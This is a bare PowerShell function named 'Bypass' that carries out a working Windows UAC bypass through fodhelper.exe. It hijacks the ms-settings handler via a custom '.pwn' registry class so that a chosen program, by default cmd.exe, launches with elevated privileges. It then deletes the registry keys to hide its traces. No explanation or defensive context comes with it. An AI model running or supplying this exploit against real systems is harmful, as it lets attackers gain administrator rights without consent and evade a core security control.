function Bypass { 
    Param (    
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe"
    )
    New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.pwn\" -Recurse -Force
}